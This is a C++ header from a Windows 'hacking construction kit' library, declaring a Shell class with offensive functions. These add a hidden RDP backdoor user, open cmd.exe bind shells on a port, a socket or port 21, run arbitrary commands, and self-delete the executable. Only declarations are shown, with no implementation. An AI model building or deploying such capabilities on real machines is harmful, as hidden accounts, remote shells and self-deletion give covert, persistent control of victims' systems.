/*
 * Hacking construction kit -- A GPL Windows security library.
 * While this library can potentially be used for nefarious purposes, 
 * it was written for educational and recreational
 * purposes only and the author does not endorse illegal use.
 *
 * This library is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 *
 * You should have received a copy of the GNU General Public License
 * along with this library.  If not, see <http://www.gnu.org/licenses/>.
 *
 * Author: thirdstormofcythraul@outlook.com
 */
#pragma once

#include <string>

#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <WinSock2.h>

/**
* Execute shell commands
*/
class Shell{
public:
	/*
	* Add this user as RDP user with this password
	* hide it from logon list, enable RDP and start service
	*/
	static void addRdpUser(const char *username, const char *password);
	/*
	* Remove this user
	*/
	static void removeRdpUser(const char *username);
	/**
	* Execute this command on a shell, in a new process
	*/
	static void executeCmd(const char *arguments);
	/**
	* Execute this command on a shell, in a new process, and return output as a string
	*/
	static std::string getCmdOutput(const char *arguments);
	/**
	* Execute this file, in a new process, and return output as a string
	*/
	static std::string getProcessOutput(const char *filename);
	/**
	* Open a process for filename with arguments
	*/
	static void execute(const char *filename, const char *arguments);
	/**
	* Open a cmd.exe shell on this port
	*/
	static bool openShell(int port);
	/**
	* Open a cmd.exe shell on this already open socket
	*/
	static void openShellOnSocket(SOCKET clientSocket);
	/**
	* Open a cmd.exe shell on port 21
	*/
	static int openShellOnFtp();

	static bool reboot();

	/**
	* Try to delete the current executable file
	* This function will create a bat which delete current file and them itself
	*/
	static void deleteCurrent();

	// use windows api to delete this file at next reboot
	static int killAtNextReboot();
};

